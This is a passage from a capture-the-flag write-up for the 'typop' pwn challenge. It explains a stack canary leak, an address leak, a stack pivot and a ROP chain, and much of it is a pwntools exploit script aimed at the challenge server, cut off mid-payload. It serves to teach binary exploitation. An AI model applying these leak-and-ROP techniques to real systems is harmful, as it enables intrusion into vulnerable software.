      &lt;td&gt;AA&lt;/td&gt;
      &lt;td&gt;AA&lt;/td&gt;
      &lt;td&gt;AA&lt;/td&gt;
      &lt;td&gt;AA&lt;/td&gt;
      &lt;td&gt;AA&lt;/td&gt;
      &lt;td&gt;AA&lt;/td&gt;
      &lt;td&gt;AA&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;AA&lt;/td&gt;
      &lt;td&gt;AA&lt;/td&gt;
      &lt;td&gt;AA&lt;/td&gt;
      &lt;td&gt;AA&lt;/td&gt;
      &lt;td&gt;AA&lt;/td&gt;
      &lt;td&gt;AA&lt;/td&gt;
      &lt;td&gt;AA&lt;/td&gt;
      &lt;td&gt;AA&lt;/td&gt;
      &lt;td&gt;00&lt;/td&gt;
      &lt;td&gt;RSP&lt;/td&gt;
      &lt;td&gt;RSP&lt;/td&gt;
      &lt;td&gt;RSP&lt;/td&gt;
      &lt;td&gt;RSP&lt;/td&gt;
      &lt;td&gt;RSP&lt;/td&gt;
      &lt;td&gt;RSP&lt;/td&gt;
      &lt;td&gt;RSP&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;We don’t really care about the last bytes of rsp, we only want the offset. But with that we can control the execution.&lt;/p&gt;

&lt;p&gt;The target of this pwn challenge is to call win:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/./assets/imgs/typop_win.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;This function will take 3 arguments, each of those a char, which will be concatenated to ‘g.txt’. As we can see in the attachments, flag.txt is the name of the flag. Therefore, we can send ‘f’, ‘l’ and ‘a’ as the arguments, read the contents and have everything dumped. For that we can do ROP: find the gadgets, add the offset and get everything in the right registers.&lt;/p&gt;

&lt;p&gt;But after running &lt;a href=&quot;https://github.com/JonathanSalwan/ROPgadget&quot;&gt;ROPGadget&lt;/a&gt; we can see that there is no way to pop a value to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;rdx&lt;/code&gt; and therefore we can’t control the last argument.&lt;/p&gt;

&lt;p&gt;Let’s change the approach. The filename is loaded from a string in $rbp-0x4a. The mode is hardcoded so we don’t have to worry about that.&lt;/p&gt;

&lt;p&gt;We know we can control rbp so we can do a stack pivot and then jump exactly to where the filename is loaded from rbp, in 0x000012ac. We are dumping the old $rbp when we dump the canary. We can substract 0x200 (or any value really) to get an empty area as our new fake stack.&lt;/p&gt;

&lt;p&gt;Then we can write a string to that area by calling &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;read&lt;/code&gt;. We can control rdi (stdin, \x00), rsi (where to write) and call &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;read&lt;/code&gt;. We can’t control rdx (the amount of bytes to read) but that would be 0x5a from previously calling &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;read&lt;/code&gt; in &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;getFeedback&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;So the exploit will work like this:&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;Do a first run of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;getFeedback&lt;/code&gt; to get the canary&lt;/li&gt;
  &lt;li&gt;Leave $rpb and $rsp as it is on the second question and provide the right canary.&lt;/li&gt;
  &lt;li&gt;Do a second run of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;getFeedback&lt;/code&gt; and get $rsp to get the offset.&lt;/li&gt;
  &lt;li&gt;Provide the canary, overflow $rbp with the new stack value and $rsp to do the ROP: the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;pop rdi&lt;/code&gt; gadget, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;\x00&lt;/code&gt; * 8  (stdin value is 0), the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;pop rsi; pop r15&lt;/code&gt; gadget, the address where to write (our new stack address - 0x4a), &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;\x00&lt;/code&gt; * 8 for the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;pop r15&lt;/code&gt;, the address of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;read&lt;/code&gt; and finally the exact position we want in &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;win&lt;/code&gt;.&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;With that, we can craft the exploit:&lt;/p&gt;

&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pwn&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;time&lt;/span&gt;

&lt;span class=&quot;c1&quot;&gt;#b = process(&apos;./chall&apos;)
&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;b&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;remote&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;typop.chal.idek.team&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1337&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;c1&quot;&gt;#gdb.attach(b,  gdbscript=&apos;b *getFeedback+178&apos;)
#gdb.attach(b,  gdbscript=&apos;b *win+220&apos;)
&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;parse_addresses&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;stack_address&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:]&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;stack_address&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;stack_address&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;sa&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x00&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;stack_address&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;

    &lt;span class=&quot;n&quot;&gt;canary&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;canary&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;sa&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x00&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;canary&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;canary&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;stack_address&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;canary&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;parse_rsp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;rsp&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;rsp&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;rsp&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;sa&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x00&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;sa&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x00&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt; 
    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;rsp&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;info&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;recvuntil&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;sa&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;?&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;send&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;sa&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;y&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;info&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;recvuntil&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;sa&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;?&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;send&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;sa&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;AAAAAAAAAA&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;recvuntil&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;sa&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;Aww&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;20&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;recvuntil&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;sa&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;?&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;stack_address&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;canary&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;parse_addresses&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;canary&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;u64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;canary&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;info&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;hex&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;canary&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)))&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;send&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;sa&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;B&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;10&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;p64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;canary&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;info&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;recvuntil&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;sa&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;?&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;send&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;sa&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;y&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;info&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;recvuntil&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;sa&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;?&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;send&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;sa&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;AAAAAAAAAAAAAAAAAAAAAAAAA&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;recvuntil&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;sa&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;Aww&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;36&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;recvuntil&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;sa&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;?&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;rsp&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;parse_rsp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;info&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;rsp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)))&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;rsp&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;u64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;rsp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;info&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;hex&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;rsp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)))&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;base_address&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;rsp&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;5191&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;win&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;rsp&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;510&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;pop_rdi&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x00000000000014d3&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;pop_rsi_r15&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x00000000000014d1&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;ret&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x000000000000101a&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;pop_rsp&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x00000000000014cd&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;new_stack_address&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;p64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;u64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;stack_address&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x2000&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;send&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;sa&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;B&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;10&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;p64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;canary&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;new_stack_address&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;p64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pop_rdi&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;base_address&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;  &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;sa&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x00&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;  &lt;span class=&quot;nf&quot;&gt;p64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pop_rsi_r15&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;base_address&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;p64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span 